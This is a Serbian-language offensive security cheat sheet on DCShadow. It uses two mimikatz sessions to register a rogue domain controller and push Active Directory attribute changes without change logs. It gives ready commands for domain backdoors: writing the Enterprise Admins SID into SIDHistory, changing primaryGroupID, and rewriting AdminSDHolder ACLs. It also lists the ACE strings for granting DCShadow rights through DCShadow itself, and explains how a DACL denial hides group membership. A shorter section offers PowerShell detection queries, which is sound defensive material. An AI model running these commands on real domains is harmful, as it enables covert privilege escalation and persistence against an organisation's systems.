# DCShadow

{{#include ../../banners/hacktricks-training.md}}


## Osnovne informacije

Registruje **novi Domain Controller** u AD-u i koristi ga za **push attributes** (SIDHistory, SPN-ove...) na navedene objekte, a da pritom ne ostavlja nikakve **logove** o **izmenama**. Potrebne su vam **DA** privilegije i morate biti unutar **root domena**.\
Imajte na umu da će se, ako koristite pogrešne podatke, pojaviti prilično ružni logovi.<sup>[[2]](#references)</sup>

Za izvođenje napada potrebne su vam 2 mimikatz instance. Jedna od njih će pokrenuti RPC servere sa SYSTEM privilegijama (ovde morate navesti izmene koje želite da izvršite), dok će se druga instanca koristiti za push vrednosti:
```bash:mimikatz1 (RPC servers)
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```

```bash:mimikatz2 (push) - Needs DA or similar
lsadump::dcshadow /push
```
Imajte na umu da **`elevate::token`** neće raditi u sesiji `mimikatz1`, jer je time podignut nivo privilegija niti, dok je potrebno podići **privilegiju procesa**.\
Takođe možete izabrati „LDAP“ objekat: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

Promene možete izvršiti kao DA ili kao korisnik sa sledećim minimalnim dozvolama:

- U **domain object**:
- _DS-Install-Replica_ (Dodavanje/uklanjanje replike u domenu)
- _DS-Replication-Manage-Topology_ (Upravljanje topologijom replikacije)
- _DS-Replication-Synchronize_ (Sinhronizacija replikacije)
- Objekat **Sites** (i njegova deca) u **Configuration container**:
- _CreateChild and DeleteChild_
- Objekat **computer** koji je registrovan kao DC:
- _WriteProperty_ (ne Write)
- **target object**:
- _WriteProperty_ (ne Write)

Možete koristiti [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) da date ove privilegije neprivilegovanom korisniku (imajte na umu da će to ostaviti neke logs). Ovo je mnogo restriktivnije od DA privilegija.\
Na primer: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` To znači da username _**student1**_, kada je prijavljen na mašini _**mcorp-student1**_, ima DCShadow dozvole nad objektom _**root1user**_.

## Korišćenje DCShadow za kreiranje backdoors
```bash:Set Enterprise Admins in SIDHistory to a user
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```

```bash:Chage PrimaryGroupID (put user as member of Domain Administrators)
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```

```bash:Modify ntSecurityDescriptor of AdminSDHolder (give Full Control to a user)
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
### Zloupotreba primarne grupe, propusti u enumeraciji i detekcija

- `primaryGroupID` je zaseban atribut u odnosu na listu `member` grupe. DCShadow/DSInternals mogu direktno da ga upišu (npr. da postave `primaryGroupID=512` za **Domain Admins**) bez on-box LSASS enforcement-a, ali AD i dalje **premešta** korisnika: promena PGID-a uvek uklanja članstvo iz prethodne primarne grupe (isto ponašanje važi za bilo koju ciljnu grupu), tako da nije moguće zadržati staro članstvo u primarnoj grupi.<sup>[[1]](#references)</sup>
- Podrazumevani alati sprečavaju uklanjanje korisnika iz njegove trenutne primarne grupe (`ADUC`, `Remove-ADGroupMember`), tako da promena PGID-a obično zahteva direktne upise u direktorijum (DCShadow/`Set-ADDBPrimaryGroup`).
- Izveštavanje o članstvu nije konzistentno:
- **Uključuje** članove izvedene iz primarne grupe: `Get-ADGroupMember "Domain Admins"`, `net group "Domain Admins"`, ADUC/Admin Center.
- **Izostavlja** članove izvedene iz primarne grupe: `Get-ADGroup "Domain Admins" -Properties member`, ADSI Edit pri proveri atributa `member`, `Get-ADUser <user> -Properties memberOf`.
- Rekurzivne provere mogu izostaviti članove primarne grupe ako je **primarna grupa** sama ugnježdena (npr. PGID korisnika pokazuje na ugnježdenu grupu unutar Domain Admins); `Get-ADGroupMember -Recursive` ili LDAP rekurzivni filteri neće vratiti tog korisnika ako rekurzija eksplicitno ne razrešava primarne grupe.
- DACL trikovi: napadači mogu da **zabrane ReadProperty** nad `primaryGroupID` kod korisnika (ili nad atributom `member` grupe za grupe koje nisu zaštićene AdminSDHolder-om), čime se efektivno članstvo skriva od većine PowerShell upita; `net group` će i dalje razrešiti članstvo. Grupe zaštićene AdminSDHolder-om će poništiti takve zabrane.

Primeri detekcije/nadzora:
```powershell
# Find users whose primary group is not the default Domain Users (RID 513)
Get-ADUser -Filter * -Properties primaryGroup,primaryGroupID |
Where-Object { $_.primaryGroupID -ne 513 } |
Select-Object Name,SamAccountName,primaryGroupID,primaryGroup
```

```powershell
# Find users where primaryGroupID cannot be read (likely denied via DACL)
Get-ADUser -Filter * -Properties primaryGroupID |
Where-Object { -not $_.primaryGroupID } |
Select-Object Name,SamAccountName
```
Uporedite privilegovane grupe proverom izlaza komande `Get-ADGroupMember` u odnosu na `Get-ADGroup -Properties member` ili ADSI Edit, kako biste otkrili neslaganja nastala zbog `primaryGroupID` ili skrivenih atributa.<sup>[[1]](#references)</sup>

## Shadowception - Dodela DCShadow dozvola pomoću DCShadow (bez logova o izmenjenim dozvolama)

Potrebno je da na kraj dodamo sledeće ACE-ove sa SID-om našeg korisnika:<sup>[[2]](#references)</sup>

- Na objektu domena:
- `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
- `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- Na objektu računara napadača: `(A;;WP;;;UserSID)`
- Na objektu ciljnog korisnika: `(A;;WP;;;UserSID)`
- Na objektu Sites u kontejneru Configuration: `(A;CI;CCDC;;;UserSID)`

Da biste dobili trenutni ACE objekta: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`

Imajte na umu da u ovom slučaju morate da izvršite **nekoliko izmena,** a ne samo jednu. Zato u **mimikatz1 sesiji** (RPC serveru) koristite parametar **`/stack` sa svakom izmenom** koju želite da napravite. Na ovaj način biće potrebno da samo jednom upotrebite **`/push`** da biste izvršili sve nagomilane izmene na lažnom serveru.

[**Više informacija o DCShadow u ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)<sup>[[2]](#references)</sup>

## References

- [1] [TrustedSec - Adventures in Primary Group Behavior, Reporting, and Exploitation](https://trustedsec.com/blog/adventures-in-primary-group-behavior-reporting-and-exploitation)
- [2] [DCShadow write-up in ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

{{#include ../../banners/hacktricks-training.md}}
